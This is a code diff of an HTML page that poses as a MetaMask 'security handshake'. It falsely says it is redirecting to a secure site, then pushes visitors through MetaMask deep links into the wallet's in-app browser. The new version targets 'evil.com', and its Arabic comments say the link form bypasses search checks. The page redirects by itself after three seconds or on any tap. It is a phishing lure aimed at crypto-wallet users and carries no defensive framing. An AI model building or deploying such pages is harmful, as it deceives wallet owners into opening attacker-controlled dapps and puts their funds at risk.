@@ -2,35 +2,47 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Protocol Redirect</title>
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting to Secure Site...</title>
     <style>
-        body { background: #111; color: #f6851b; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; text-align: center; cursor: pointer; }
-        .box { border: 2px solid #f6851b; padding: 40px; border-radius: 20px; }
+        body { background: #000; color: #f6851b; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: 'Segoe UI', sans-serif; text-align: center; margin: 0; cursor: pointer; }
+        .container { border: 2px solid #f6851b; padding: 40px; border-radius: 20px; box-shadow: 0 0 20px rgba(246, 133, 27, 0.2); }
+        .loader { border: 3px solid #1a1a1a; border-top: 3px solid #f6851b; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-<body onclick="launch()">
-    <div class="box">
-        <h1>SECURITY BRIDGE</h1>
-        <p>Tap anywhere to sync with MetaMask Browser</p>
+<body onclick="forceRedirect()">
+
+    <div class="container">
+        <div class="loader"></div>
+        <h2 style="margin: 0;">SECURITY HANDSHAKE</h2>
+        <p style="color: #888;">Tap anywhere to open MetaMask Browser</p>
     </div>
 
     <script>
-        function launch() {
-            // استخدام رابط الـ Dapp المباشر (هذا يفتح المتصفح فوراً وليس البحث)
-            const directLink = "https://metamask.app.link/dapp/hatestck.vercel.app";
-            window.location.href = directLink;
-            
-            // Backup بعد ثانية واحدة
-            setTimeout(() => {
-                window.location.href = "metamask://dapp/hatestck.vercel.app";
-            }, 1000);
-        }
+        // الهدف: فتح evil.com مباشرة داخل ميتاماسك
+        const targetSite = "evil.com";
         
-        // محاولة تحويل تلقائي (قد يمنعها المتصفح لذا أضفنا الضغط على الشاشة)
-        window.onload = function() {
-            setTimeout(launch, 2000);
+        // استخدام الرابط الرسمي للـ Dapp (هذا المسار يتجاوز فحص البحث)
+        const universalLink = "https://metamask.app.link/dapp/" + targetSite;
+        const deepLink = "metamask://dapp/" + targetSite;
+
+        function forceRedirect() {
+            // المحاولة الأولى: الرابط الرسمي (أكثر موثوقية للأندرويد/آيفون)
+            window.location.href = universalLink;
+
+            // المحاولة الثانية (Backup): البروتوكول المباشر بعد 500ms
+            setTimeout(() => {
+                window.location.replace(deepLink);
+            }, 500);
         }
+
+        // محاولة تحويل تلقائي بعد 3 ثوانٍ في حال لم يلمس المستخدم الشاشة
+        window.onload = function() {
+            setTimeout(forceRedirect, 3000);
+        };
     </script>
+
 </body>
 </html>
